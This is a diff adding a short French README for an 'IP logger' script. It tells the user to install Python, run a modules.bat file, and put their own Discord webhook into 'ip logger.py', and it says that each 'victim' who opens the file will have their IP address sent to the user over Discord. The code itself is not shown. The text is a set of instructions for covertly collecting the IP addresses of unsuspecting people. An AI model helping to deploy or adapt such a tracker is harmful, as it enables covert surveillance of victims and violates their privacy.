@@ -1,0 +1,7 @@
+Voici un ip logger tres simple d'utilisations
+
+1 : avoir python (Je pense que tout le monde a) xD
+2 : Ouvrire le modules.bat (J'ai laisser le code pour ce qui non pas confiance)
+3 : editer le ip logger.py et remplacer ton webhook par le vautre 
+
+ Mtn chaque victime qui ouvrira le fichier vous aurez sont ip qui vous seras envoyer par discord :p
